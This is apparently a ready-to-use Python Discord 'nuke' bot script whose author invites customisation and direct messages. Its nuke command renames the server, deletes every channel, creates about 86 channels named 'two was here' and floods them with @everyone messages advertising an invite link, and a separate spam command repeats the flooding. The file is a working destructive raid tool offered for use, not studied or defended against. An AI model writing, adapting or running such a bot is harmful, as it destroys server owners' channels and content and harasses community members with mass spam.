import discord
from discord.ext import commands, tasks
import os
import asyncio

prefix='>'
n=0

intents=discord.Intents.default()
intents = discord.Intents(messages=True, guilds=True)




client = commands.Bot(command_prefix=prefix, intents=intents)
@client.event
async def on_ready():
    print('Bot is online')
    await client.change_presence(activity=discord.Game('discord.gg/trends')) #YOU MAY CHANGE STATUS

@client.command()
async def ping(ctx):
    await ctx.send(f'Pong! {round(client.latency * 1000)}ms')

@client.command
async def invite(ctx):
  await ctx.reply('')

@client.command()
async def nuke(ctx):

    await ctx.guild.edit(name='two#8821 | discord.gg/trends') #YOU MAY CHANGE SERVER NAME

    for c in ctx.guild.channels:
        await c.delete()

    guild = ctx.message.guild

    n=0
    while(n<=85):
        await guild.create_text_channel('two was here') #YOU MAY CHANGE SPAM CHANNELS NAME
        n = n+1

    for c in ctx.guild.text_channels:
             await c.send('@everyone two#3082 was here join discord.gg/trends') #YOU MAY CHANGE SPAMMING TEXT
             await c.send('@everyone two#3082 was here join discord.gg/trends')
             await c.send('@everyone two#3082 was here join discord.gg/trends')
             await c.send('@everyone two#3082 was here join discord.gg/trends')
             await c.send('@everyone two#3082 was here join discord.gg/trends')

@client.command()
async def spam(ctx):
    for c in ctx.guild.text_channels:
             await c.send('@everyone two#3082 was here join discord.gg/trends') #YOU MAY CHANGE SPAMMING TEXT
             await c.send('@everyone two#3082 was here join discord.gg/trends')
             await c.send('@everyone two#3082 was here join discord.gg/trends')
             await c.send('@everyone two#3082 was here join discord.gg/trends')
             await c.send('@everyone two#3082 was here join discord.gg/trends')

client.run('YOUR TOKEN HERE') #DISCORD TOKEN IN BETWEEN THE '

#IF THIS DOESNT WORK DM ME ON MY CORD two#3082
